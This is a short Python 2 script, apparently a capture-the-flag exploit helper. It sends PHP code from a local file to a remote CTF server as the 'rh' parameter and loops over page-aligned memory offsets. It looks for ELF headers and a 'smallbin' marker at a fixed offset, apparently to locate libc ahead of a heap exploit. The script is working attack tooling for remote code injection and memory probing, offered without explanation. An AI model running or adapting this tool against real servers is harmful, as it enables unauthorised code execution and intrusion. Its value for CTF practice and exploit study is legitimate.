import requests
import subprocess
import sys

with open("test.php", "rb") as f:
    data = f.read()[6:-3].lstrip().strip()

def write_shit(data):
    with open("test2.php", "wb") as f:
        f.write("<?php "+data+"?>")

def gen_out(data):
    return requests.get("http://pwnable.org:19261/", params={'rh':data}).content
    # write_shit(data)
    # return subprocess.check_output("php test.php", shell=True)



def get_offset(offset):
    new_data = data.replace("REPLACE_OFFSET", str(offset))
    return gen_out(new_data)


for m in range(int(sys.argv[1]), int(sys.argv[2])):
    try:
        if m%0x40 == 0:
            print "Currently -> {}".format(m)
        deet = get_offset(m*0x1000);
        if "ELF" in deet:
            print "SICE -> {}".format(m)
            print(deet)
            new_l = get_offset(m*0x1000 + 0x1b8be8)
            if 'smallbin' in new_l:
                print "BIGSICE -> {}".format(m)
    except:
        pass

